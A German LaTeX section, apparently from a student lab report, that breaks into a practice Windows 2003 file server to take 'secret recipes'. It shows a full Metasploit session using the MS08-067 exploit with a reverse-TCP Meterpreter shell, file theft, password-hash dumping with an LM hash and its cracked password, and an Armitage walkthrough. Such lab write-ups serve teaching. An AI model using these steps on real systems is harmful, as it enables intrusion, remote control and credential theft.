\subsection{Dateiserver hacken}
\label{sec:dateiserverhacken}

\subsubsection{Zugriff auf den Dateiserver}

Aus den offenen Ports des Rechners \path{datei.mayerbrot.local} kann man
schließen, dass es sich um einen Windows Server handelt.

Um an die Rezepte zu kommen, versuchen wir über den \emph{Windows Explorer} auf
den Dateiserver zuzugreifen.  Dazu geben wir den Pfad
\textbackslash\textbackslash172.16.14.40 ein. Daraufhin werden insbesondere die
Freigaben \path{public} und \path{Geheimrezepte} aufgelistet. Unter der Freigabe
\path{public} ist das erste Rezept in verschlüsselter Form frei
zugänglich\footnote{Die Entschlüsselung des Rezepts wird in
  \cref{RezeptEinsEntschluesseln} gezeigt}.

Auf das public Verzeichnis kann alternativ auch von einem Linux oder Free-BSD
Rechner einfach zugegriffen werden. Dazu wird die Freigabe
\glqq{}gemountet\grqq{} und die Dateien können mit regulären UNIX Befehlen
angesehen und kopiert werden:

\begin{lstlisting}
% mkdir /mnt/cifs
% sudo mount -t cifs //172.16.14.40/public /mnt/cifs
% cd /mnt/cifs
% ls
Rezept1NR.txt  testdatei.txt
% cp -v Rezept1NR.txt /home/xxx
`Rezept1NR.txt' -> `/home/xxx/Rezept1NR.txt'
\end{lstlisting}

 Die Freigabe \path{Geheimrezepte} ist aber geschützt, so das wir darauf nicht
 zugreifen können. Da es sehr unwahrscheinlich ist, das richtige Kennwort zu
 erraten, werden wir auf Hacking-Tools zugreifen.

\subsubsection{Metasploit}

Das \Metasploit{}-Projekt ist ein freies Open-Source-Projekt zur
Computersicherheit, das Informationen über Sicherheitslücken bietet und bei
Penetrationstests sowie der Entwicklung von IDS-Signaturen eingesetzt werden
kann. Das bekannteste Teilprojekt ist das \emph{Metasploit Framework}, ein
Werkzeug zur Entwicklung und Ausführung von Exploits\footnote{Ein Exploit dient
  dem Eindringen in ein Zielsystem, indem ein Programmfehler ausgenutzt wird.}
gegen verteilte Zielrechner.

Andere wichtige Teilprojekte sind das Shellcode-Archiv\footnote{Payload
  (Nutzlast) bezeichnet den Code, der auf dem Zielrechner bei einem
  erfolgreichen Einbruch ausgeführt werden soll. Meist ist dies Shellcode, der
  dem Angreifer ermöglicht auf eine Shell zuzugreifen. Es könnte aber auch ein
  Meterpreter (spezielle Metasploit shell) oder VNC-Server ausgeführt werden.}
Werkzeuge zur weiteren Analyse oder Manipulation eines übernommenen Systems
(Post)\footnote{Hierunter fallen beispielsweise das Auslesen von System-
  bzw. Anwendungsinformationen, das Installieren einer permanenten Hinterür und
  die Ausweitung der bereits erlangten Benutzerrechte.} und Hilfswerkzeuge
(Auxiliary).

Die Hilfswerkzeuge sind im einzelnen:

\begin{itemize}
  \item ``Scanner'' zur Analyse von Computerssystemen.
  \item ``Sniffer'' zur Aufzeichnung des Datenverkehrs eines Netzwerks.
  \item ``Spoofer'' zur Manipulation von Netzwerkprotokollen. (ARP/MAC/DHCP, DNS)
  \item ``Fuzzers'' Automatisierte Tests, die mit Hilfe von ungültigen,
    unerwarteten oder zufälligen Daten einen Dienst auf sicherheitsrelevante
    Probleme untersuchen.
  \item Serverdienste und Clients. (FTP, SMTP, DNS, DHCP, POP3, usw.)
\end{itemize}

Für Verwendung des Frameworks stehen mehrere Alternativen zur Verfügung:

\begin{itemize}
  \item msfconsole --- Eine interaktive Konsolenanwendung
  \item msfcli     --- Kommandozeilenbasierte Ausführung einzelner Befehle.
  \item Armitage   --- GUI-Frontend
\end{itemize}

\subsubsection{Metasploit Konsole}

Nachdem die Metasploitkonsole über den Befehl \lstinline{./msfconsole} gestartet
wurde, begrüßt sie den Benutzer mit den Anzahlen der bekannten
Sicherheitslücken, Payloads etc.:
\begin{lstlisting}[language=Metasploit]
[*] Please wait while the Metasploit Pro Console initializes...

[*] Starting Metasploit Console...
       =[ metasploit v3.4.0-release [core:3.4 api:1.0]

+-- --=[ 840 exploits - 495 auxiliary - 146 post

+-- --=[ 250 payloads - 27 encoders - 8 nops
\end{lstlisting}

Metasploit wird angewiesen den gewünschten Exploit zu laden und anschließend mit
den nötigen Optionen konfiguriert:
\begin{lstlisting}[language=Metasploit]
msf > use exploit/windows/smb/ms08_067_netapi
msf  exploit(ms08_067_netapi) > set RHOST 172.16.14.40

RHOST => 172.16.14.40

msf  exploit(ms08_067_netapi) > set LHOST 172.16.20.17

LHOST => 172.16.20.17

msf  exploit(ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp

PAYLOAD => windows/meterpreter/reverse_tcp
\end{lstlisting}


Die vorgenommenen Einstellungen werden überprüft:
\begin{lstlisting}[language=Metasploit]
msf  exploit(ms08_067_netapi) > show options

Module options (exploit/windows/smb/ms08_067_netapi):
   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST    172.16.14.40     yes       The target address
   RPORT    445              yes       Set the SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique: seh, thread, process, none
   LHOST     172.16.20.17     yes       The listen address
   LPORT     4444             yes       The listen port

Exploit target:
   Id  Name
   --  ----
   0   Automatic Targeting
\end{lstlisting}

Der Exploit wird gestartet:
\begin{lstlisting}[language=Metasploit]
msf  exploit(ms08_067_netapi) >
msf  exploit(ms08_067_netapi) > exploit

[*] Started reverse handler on 172.16.14.40:4444
[*] Automatically detecting the target...
[*] Fingerprint: Windows 2003 - No Service Pack - lang:Unknown
[*] Selected Target: Windows 2003 SP0 Universal
[*] Attempting to trigger the vulnerability...
[*] Sending stage (752128 bytes) to 172.16.14.40
[*] Meterpreter session 1 opened (172.16.20.17:4444 -> 172.16.14.40:1028)

at 2012-07-07 11:30:14 +0200
\end{lstlisting}

Wir waren erfolgreich, und sind jetzt auf dem Zielsystem. Anschließend wurde
noch nach laufenden Prozessen auf dem Zielsystem gesucht. Uns interessierte der
Prozess 1696 (explorer.exe):
\begin{lstlisting}[language=Metasploit]
meterpreter > ps

Process list
============
 PID   Name              Arch  Session  User  Path
 ---   ----              ----  -------  ----  ----

 0     [System Process]

 4     System            x86   0        $U$NTAUTORITT\SYSTEM-0x4e542d4155544f524954c4545c53595354454d
.
.
.

 1488  dfssvc.exe        x86   0        $U$NTAUTORITT\SYSTEM-0x4e542d4155544f524954c4545c53595354454d                          C:\WINDOWS\system32\Dfssvc.exe

 1696  explorer.exe      x86   0        TEST-174JNJRAFI\Administrator                                                          C:\WINDOWS\Explorer.EXE

.
.
.
 2012  cmd.exe           x86   0        TEST-174JNJRAFI\Administrator                                                          C:\WINDOWS\system32\cmd.exe
\end{lstlisting}

Wir migrierten zum Prozess 1696:
\begin{lstlisting}[language=Metasploit]
meterpreter > migrate 1696

[*] Migrating to 1696...

[*] Migration completed successfully.

meterpreter > ?

Core Commands
=============
    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bgkill                    Kills a background meterpreter script

.
.
.

Priv: Timestomp Commands
========================

    Command       Description
    -------       -----------
    timestomp     Manipulate file MACE attributes
\end{lstlisting}

Nun können wir nach dem Rezept suchen:
\begin{lstlisting}[language=Metasploit]
Listing: C:\

============
Mode              Size        Type  Last modified              Name
----              ----        ----  -------------              ----
100777/rwxrwxrwx  0           fil   2012-06-16 13:45:23 +0200  AUTOEXEC.BAT
100666/rw-rw-rw-  0           fil   2012-06-16 13:45:23 +0200  CONFIG.SYS
40777/rwxrwxrwx   0           dir   2012-06-27 21:22:05 +0200  Dokumente und Einstellungen
40777/rwxrwxrwx   0           dir   2012-06-17 22:48:54 +0200  Geheimrezepte
100444/r--r--r--  0           fil   2012-06-16 13:45:23 +0200  IO.SYS
100444/r--r--r--  0           fil   2012-06-16 13:45:23 +0200  MSDOS.SYS
100555/r-xr-xr-x  47548       fil   2003-03-26 14:00:00 +0100  NTDETECT.COM
40777/rwxrwxrwx   0           dir   2012-06-20 10:39:49 +0200  OpenSSL-Win32
40555/r-xr-xr-x   0           dir   2012-07-02 22:38:16 +0200  Programme
40777/rwxrwxrwx   0           dir   2012-06-16 13:49:13 +0200  RECYCLER
40777/rwxrwxrwx   0           dir   2012-07-04 19:50:51 +0200  System Volume Information
40777/rwxrwxrwx   0           dir   2012-06-16 18:07:44 +0200  WINDOWS
100666/rw-rw-rw-  190         fil   2012-06-16 13:42:44 +0200  boot.ini
100444/r--r--r--  4952        fil   2003-03-26 14:00:00 +0100  bootfont.bin
100666/rw-rw-rw-  224045      fil   2012-07-02 11:09:57 +0200  events.txt
100666/rw-rw-rw-  1610612736  fil   2012-07-04 19:50:50 +0200  pagefile.sys
40777/rwxrwxrwx   0           dir   2012-07-01 00:55:54 +0200  public
40777/rwxrwxrwx   0           dir   2012-06-16 13:45:30 +0200  wmpub

meterpreter > cd "Dokumente und Einstellungen"
meterpreter > ls

Listing: C:\Dokumente und Einstellungen

=======================================

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40777/rwxrwxrwx  0     dir   2012-06-27 21:22:05 +0200  .
40777/rwxrwxrwx  0     dir   1980-01-01 00:00:00 +0100  ..
40777/rwxrwxrwx  0     dir   2012-06-17 22:53:43 +0200  Administrator
40777/rwxrwxrwx  0     dir   2012-06-16 13:44:56 +0200  All Users
40777/rwxrwxrwx  0     dir   2012-07-03 18:35:16 +0200  Christian
40777/rwxrwxrwx  0     dir   2012-06-16 13:45:24 +0200  Default User
40777/rwxrwxrwx  0     dir   2012-06-16 13:47:01 +0200  LocalService
40777/rwxrwxrwx  0     dir   2012-06-27 11:59:54 +0200  Marcel
40777/rwxrwxrwx  0     dir   2012-06-16 13:47:00 +0200  NetworkService
40777/rwxrwxrwx  0     dir   2012-07-03 21:11:16 +0200  Rene
40777/rwxrwxrwx  0     dir   2012-06-26 11:07:38 +0200  User0815

meterpreter > cd User0815
meterpreter > ls

Listing: C:\Dokumente und Einstellungen\User0815

================================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
40555/r-xr-xr-x   0       dir   2012-06-16 14:34:19 +0200  $U$Startmen-0x53746172746d656efc
40777/rwxrwxrwx   0       dir   2012-06-26 11:07:38 +0200  .
40777/rwxrwxrwx   0       dir   2012-06-27 21:22:05 +0200  ..
40555/r-xr-xr-x   0       dir   2012-06-26 11:07:38 +0200  Anwendungsdaten
40777/rwxrwxrwx   0       dir   2012-06-16 13:45:16 +0200  Cookies
40777/rwxrwxrwx   0       dir   2012-06-16 14:34:19 +0200  Desktop
40777/rwxrwxrwx   0       dir   2012-06-16 14:34:19 +0200  Druckumgebung
40555/r-xr-xr-x   0       dir   2012-06-26 11:07:39 +0200  Eigene Dateien
40555/r-xr-xr-x   0       dir   2012-06-26 11:07:45 +0200  Favoriten
40777/rwxrwxrwx   0       dir   2012-06-16 14:34:19 +0200  Lokale Einstellungen
100666/rw-rw-rw-  524288  fil   2012-06-28 01:32:07 +0200  NTUSER.DAT
40777/rwxrwxrwx   0       dir   2012-06-16 14:34:19 +0200  Netzwerkumgebung
40555/r-xr-xr-x   0       dir   2012-06-27 12:15:35 +0200  Recent
40555/r-xr-xr-x   0       dir   2012-06-26 11:07:38 +0200  SendTo
100666/rw-rw-rw-  0       fil   2012-06-16 14:34:53 +0200  Sti_Trace.log
40777/rwxrwxrwx   0       dir   2012-06-16 14:34:19 +0200  Vorlagen
100666/rw-rw-rw-  1024    fil   2012-06-28 01:32:07 +0200  ntuser.dat.LOG
100666/rw-rw-rw-  192     fil   2012-06-28 01:32:07 +0200  ntuser.ini

meterpreter > cd Desktop
meterpreter > ls

Listing: C:\Dokumente und Einstellungen\User0815\Desktop

========================================================

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40777/rwxrwxrwx  0     dir   2012-06-16 14:34:19 +0200  .
40777/rwxrwxrwx  0     dir   2012-06-26 11:07:38 +0200  ..

meterpreter > cd ..
meterpreter > cd Recent
meterpreter > ls

Listing: C:\Dokumente und Einstellungen\User0815\Recent

=======================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40555/r-xr-xr-x   0     dir   2012-06-27 12:15:35 +0200  .
40777/rwxrwxrwx   0     dir   2012-06-26 11:07:38 +0200  ..
100666/rw-rw-rw-  150   fil   2012-06-26 11:07:39 +0200  Desktop.ini
100666/rw-rw-rw-  408   fil   2012-06-26 11:13:40 +0200  Geheimrezepte.lnk
100666/rw-rw-rw-  511   fil   2012-06-26 12:21:09 +0200  Rezept1NR.lnk
100666/rw-rw-rw-  562   fil   2012-06-26 11:13:40 +0200  Rezept2NJ.lnk
100666/rw-rw-rw-  511   fil   2012-06-26 11:14:01 +0200  Testdatei.lnk
100666/rw-rw-rw-  392   fil   2012-06-27 12:15:35 +0200  WINDOWS.lnk
100666/rw-rw-rw-  529   fil   2012-06-27 12:15:34 +0200  netfxocm.lnk
100666/rw-rw-rw-  371   fil   2012-06-26 12:21:09 +0200  public.lnk

meterpreter > search Geheimrezepte

[-] You must specify a valid file glob to search for, e.g. >search -f *.doc

meterpreter > search -f Rezept*

Found 6 results...

    c:\\Dokumente und Einstellungen\Administrator\Recent\Rezept1NR.txt.lnk (552 bytes)
    c:\\Dokumente und Einstellungen\Marcel\Recent\Rezept1NR.txt.lnk (552 bytes)
    c:\\Dokumente und Einstellungen\User0815\Recent\Rezept1NR.lnk (511 bytes)
    c:\\Dokumente und Einstellungen\User0815\Recent\Rezept2NJ.lnk (562 bytes)
    c:\\Geheimrezepte\Rezept2NJ.txt (745 bytes)
    c:\\public\Rezept1NR.txt (801 bytes)

meterpreter > cd ..
meterpreter > cd ..
meterpreter > cd ..
meterpreter > cd Geheimrezepte
meterpreter > ls

Listing: C:\Geheimrezepte
=========================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40777/rwxrwxrwx   0     dir   2012-06-17 22:48:54 +0200  .
40777/rwxrwxrwx   0     dir   1980-01-01 00:00:00 +0100  ..
100666/rw-rw-rw-  745   fil   2012-06-17 22:47:47 +0200  Rezept2NJ.txt

meterpreter > download Rezept2NJ.txt

[*] downloading: Rezept2NJ.txt -> Rezept2NJ.txt
[*] downloaded : Rezept2NJ.txt -> Rezept2NJ.txt

meterpreter > ;-)
\end{lstlisting}

Ein alternativer Weg, um in der Meterpreter-Session die Rezepte zu finden, geht
über die Auflistung der vorhandenen Freigaben mit dem Windows-Befehl \emph{net
  use} in einer zuvor mit dem Befehl \emph{shell} geöffneten
Windows-Kommandozeile. Daraus kann dann direkt der dahinterliegende Ordner
gefunden und seine Inhalte aufgelistet werden\ldots

\lstinputlisting[language=Metasploit,inputencoding=latin1]{listings/meterpreter_net_share.txt}

Außerdem kann man sich noch mit dem Befehl \emph{hashdump} die lokale
Nutzerdatenbank mit den Passwort-Hashes ausgeben lassen. Die dort von Windows
2003 standardmäßig gespeicherten LM-Hashes lassen sich mit Hilfe von
Rainbow-Tables innerhalb von wenigen Sekunden entschlüsseln, z. B. online unter
\url{http://www.crack-online.com/}. Als Administrator-Passwort konnte
beispielsweise durch das Analysieren-Lassen
von\\ \emph{30b56c5a33fbec925395a77c12853f9f:d9147b2c2e2c06320ae8af50bc71d67d}\\ das
Passwort \emph{mayermayer\#} ermittelt werden.

\lstinputlisting[language=Metasploit,inputencoding=latin1]{listings/meterpreter_hashdump.txt}

\subsubsection{Armitage}

Für den Zugriff auf das \emph{Metasploit Framework} gibt es verschiedene
Benutzeroberflächen.  Eine davon ist \Armitage{}. Dabei handelt es sich um eine
grafische Oberfläche, die eine einfache und intuitive Bedienung ermöglicht. Für
unsere Hacking-Versuche wählen wir daher \Armitage.

Nach dem Programmstart müssen wir zuerst den anzugreifenden Computer
bestimmen. Dazu wählen wir im Menü \emph{Hosts} den Eintrag \emph{\glqq{}Add
  Hosts~\dots{}\grqq{}} und fügen die IP-Adresse 172.16.14.40 hinzu.

Bevor wir mit der Schwachstellen-Analyse beginnen können, muss \Armitage{}
Informationen über den anzugreifenden Rechner erhalten. Das erreichen wir, indem
wir über das Kontextmenü des Hosts einen \emph{Scan} starten. \Armitage{}
bekommt so eine Liste der offenen Ports und der verfügbaren Dienste und kann mit
der Schwachstellen-Analyse beginnen.

Hierzu wählen wir im Menü \emph{Attacks} den Befehl \emph{\glqq{}Find
  Attacks\grqq{}}. \Armitage{} zeigt daraufhin \emph{mögliche} Angriffspunkte
(sog. \emph{Exploits}) in den Kategorien \texttt{dcerpc}, \texttt{ids},
\texttt{oracle}, \texttt{samba} und \texttt{smb} an. Ob das System tatsächlich
über diese Exploits angreifbar ist, prüfen wir mit der Funktion
\emph{\glqq{}check exploits~\dots\grqq{}}. Nur für den Exploit
\texttt{windows/smb/ms08\_067\_netapi} wird eine Verwundbarkeit
bestätigt. (siehe \bildref{DateiserverHacken1}).

\bilddatei{DateiserverHacken1}{Check Exploits}{0.7}

Über das Kontextmenü rufen wir diesen Exploit auf. Der erfolgreiche Angriff ist
sofort grafisch zu erkennen, weil das Host jetzt rot dargestellt wird und mit
Blitzen versehen ist. Jetzt können wir verschiedene Funktionen auf dem Host
durchführen.  Um das zweite Rezept herunter zu laden gehen wir im Kontextmenü
über \emph{Meterpreter 1} und \emph{Explore} zu \emph{\glqq{}Browse
  files\grqq{}}. Daraufhin erscheint eine Registerkarte, mit den Dateien und
Verzeichnissen des Dateiservers. Jetzt können zum Verzeichnis
\path{C:\Geheimrezepte} navigieren und anschließend über das Kontextmenü das
verschlüsselte Rezept\footnote{Die Entschlüsselung des Rezepts wird in
  \cref{RezeptZweiEntschluesseln} gezeigt} herunterladen (siehe
\bildref{DateiserverHacken3}).

\bilddateisloppy{DateiserverHacken3}{Datei herunterladen}{0.7}
